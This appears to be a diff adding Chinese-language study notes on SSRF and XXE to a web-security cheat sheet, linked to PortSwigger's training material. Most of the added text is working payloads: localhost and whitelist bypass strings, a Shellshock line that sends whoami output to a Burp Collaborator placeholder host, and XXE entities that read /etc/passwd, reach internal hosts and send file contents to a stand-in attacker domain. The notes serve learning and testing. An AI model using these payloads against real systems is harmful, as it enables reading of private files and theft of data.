@@ -509,3 +509,107 @@ def handleResponse(req, interesting):
 ## SSRF
 
 [SSRF](../webapp/ServerSideAttacks#ssrf) (**Server-Side Request Forgery**)是一种 Web 安全漏洞，攻击者可以诱导服务端应用向攻击者指定的目标发起请求。本质上是"借服务器的手"去访问它本不该访问、或攻击者自己无法直接访问的资源。
+
+[portswigger-ssrf](https://portswigger.net/web-security/ssrf)
+
+**黑名单过滤绕过**
+
+- `127.0.0.1` ⬇️
+```txt
+127.1
+2130706433
+017700000001
+```
+- 使用 URL 编码或大小写变化来混淆被屏蔽的字符串。
+```txt
+127.1/aDmIn
+
+# 双重URL编码 
+127.1/%25%36%31dmin
+```
+- 注册一个解析到 127.0.0.1 的域名
+
+**白名单过滤**
+
+```txt
+username#@stock.weliketoshop.net
+
+127.0.0.1%2523@stock.weliketoshop.net
+
+localhost:80%2523@stock.weliketoshop.net/admin
+```
+
+**ShellShock**
+
+**paylaod**
+```bash
+() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+```
+
+## XXE injection
+
+[XXE](../webapp/InjectionAttacks#xxe-injection)(**XML External Entity Injection**，**XML 外部实体注入**)是一种针对解析 XML 输入的应用程序的安全漏洞。当应用使用的 XML 解析器允许解析外部实体，且攻击者能控制 XML 输入内容时，就可能被利用。
+
+**核心原理**
+
+XML 支持通过 **DTD**（文档类型定义）定义实体（**entity**），实体可以引用外部资源。如果解析器没有禁用外部实体解析，攻击者就能构造恶意实体来读取文件、发起请求等。
+
+<span style="font-size: 19px;">**Payload**</span>
+
+*retrieve files*
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+```
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1"> ]>
+```
+
+*SSRF attacks or Blind 外部实体&*
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+```
+*Blind 参数实体%*
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://xxx.web-attacker.com"> %xxe; ]>
+```
+
+**malicious DTD**
+
+*out-of-band*
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+*error messages*
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+**Exploiting blind XXE by repurposing a local DTD**
+
+*Locating an existing DTD file to repurpose参数实体*
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+*Payload*
+```xml
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+- `file:///usr/local/app/schema.dtd`
+- `custom_entity`
